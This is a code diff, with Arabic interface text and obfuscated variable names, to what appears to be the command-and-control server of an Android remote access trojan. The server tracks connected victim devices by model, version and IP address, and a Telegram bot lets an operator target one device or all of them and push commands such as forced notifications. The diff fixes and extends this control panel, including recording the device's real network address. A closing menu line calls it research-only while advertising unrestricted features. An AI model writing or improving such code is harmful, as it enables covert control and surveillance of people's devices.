@@ -52,9 +52,11 @@ app.get("/text", (_0x5b9a91, _0x340799) => {
 io.on("connection", _0x48afef => {
   let _0x35d854 = _0x48afef.handshake.headers.model + '-' + io.sockets.sockets.size || "لا توجد معلومات";
   let _0x3e1fde = _0x48afef.handshake.headers.version || "لا توجد معلومات";
-  let _0x4c49f4 = _0x48afef.handshake.headers.ip || "لا توجد معلومات";
+  let _0x4c49f4 = _0x48afef.handshake.address || "لا توجد معلومات";
   _0x48afef.model = _0x35d854;
   _0x48afef.version = _0x3e1fde;
+  _0x48afef.ip = _0x4c49f4;
+  _0x48afef.handshake.time = new Date().toLocaleString();
 
   let _0x5ede9b = "<b>✯ جهاز جديد متصل</b>\n\n" +
     "<b>النوع</b> → " + _0x35d854 + "\n" +
@@ -305,6 +307,7 @@ bot.on("message", _0xdbde0c => {
     } else if (appData.get("currentAction") === "notificationText") {
       let _0x371a40 = _0xdbde0c.text;
       appData.set("currentNotificationText", _0x371a40);
+      let target = appData.get("currentTarget");
       if (target == "all") {
         io.sockets.emit("commend", {
           'request': "popNotification",
@@ -319,9 +322,6 @@ bot.on("message", _0xdbde0c => {
           'extras': [{
             'key': "text",
             'value': _0x371a40
-          }, {
-            'key': "url",
-            'value': url
           }]
         });
       }
@@ -349,7 +349,7 @@ bot.on("message", _0xdbde0c => {
       } else {
         let _0x1e2656 = "<b>✯ عدد الأجهزة المتصلة: " + io.sockets.sockets.size + "</b>\n\n";
         let _0x518a8a = 1;
-        io.sockets.sockets.forEach((_0x3479dd, _0x29c6f5, _0x222cae) => {
+        io.sockets.sockets.forEach((_0x3479dd, _0x29c6f5) => {
           _0x1e2656 += "<b>الجهاز " + _0x518a8a + "</b>\n" +
             "<b>النوع</b> → " + _0x3479dd.model + "\n" +
             "<b>الإصدار</b> → " + _0x3479dd.version + "\n" +
@@ -368,7 +368,7 @@ bot.on("message", _0xdbde0c => {
         });
       } else {
         let _0x307c8a = [];
-        io.sockets.sockets.forEach((_0x6307e5, _0x56439e, _0x42b7c1) => {
+        io.sockets.sockets.forEach((_0x6307e5, _0x56439e) => {
           _0x307c8a.push([_0x6307e5.model]);
         });
         _0x307c8a.push(["✯ الكل ✯"]);
@@ -388,7 +388,7 @@ bot.on("message", _0xdbde0c => {
         "لأغراض البحث والتوعية الأمنية فقط\n" +
         "جميع الميزات متاحة دون قيود",
         {
-          'parse_mode': 'HTML'
+          'parse_mode': "HTML"
         }
       );
     } else if (_0xdbde0c.text === "✯ العودة للقائمة الرئيسية ✯") {
@@ -403,8 +403,9 @@ bot.on("message", _0xdbde0c => {
         }
       });
     } else if (_0xdbde0c.text === "✯ إلغاء الإجراء ✯") {
-      let _0x3202e5 = io.sockets.sockets.get(appData.get("currentTarget")).model;
-      if (_0x3202e5 == "all") {
+      let targetId = appData.get("currentTarget");
+      let _0x3202e5 = targetId === "all" ? "جميع الأجهزة" : (io.sockets.sockets.get(targetId)?.model || "الجهاز المحدد");
+      if (_0x3202e5 == "جميع الأجهزة") {
         bot.sendMessage(data.id, "<b>✯ اختر الإجراء المراد تنفيذه على جميع الأجهزة المتاحة</b>\n\n", {
           'parse_mode': "HTML",
           'reply_markup': {
@@ -676,7 +677,7 @@ bot.on("message", _0xdbde0c => {
         });
       }
     } else {
-      io.sockets.sockets.forEach((_0x22a16b, _0x30e015, _0x5acd93) => {
+      io.sockets.sockets.forEach((_0x22a16b, _0x30e015) => {
         if (_0xdbde0c.text === _0x22a16b.model) {
           appData.set("currentTarget", _0x30e015);
           bot.sendMessage(data.id, "<b>✯ اختر الإجراء المراد تنفيذه على " + _0x22a16b.model + "</b>\n\n", {
@@ -737,7 +738,7 @@ bot.on("message", _0xdbde0c => {
 
 // إبقاء الاتصال نشط
 setInterval(() => {
-  io.sockets.sockets.forEach((_0x107f46, _0x316932, _0x1f46f7) => {
+  io.sockets.sockets.forEach((_0x107f46, _0x316932) => {
     io.to(_0x316932).emit("ping", {});
   });
 }, 5000);
